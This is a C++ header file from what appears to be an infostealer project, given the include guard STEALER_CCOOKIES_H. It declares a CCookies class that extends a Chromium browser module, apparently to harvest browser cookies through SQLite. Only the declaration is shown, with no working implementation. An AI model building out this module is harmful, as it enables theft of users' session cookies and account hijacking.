//
// Created by .1qxz on 09.06.2024.
//

#ifndef STEALER_CCOOKIES_H
#define STEALER_CCOOKIES_H


#include "../ChromiumBrowserModule.h"
#include "../../../../../utils/SQLiteUtil.h"

class CCookies : public ChromiumBrowserModule {
public:
    void execute(const fs::path &root, const std::string &name, const fs::path &browser_root) override;
};


#endif //STEALER_CCOOKIES_H
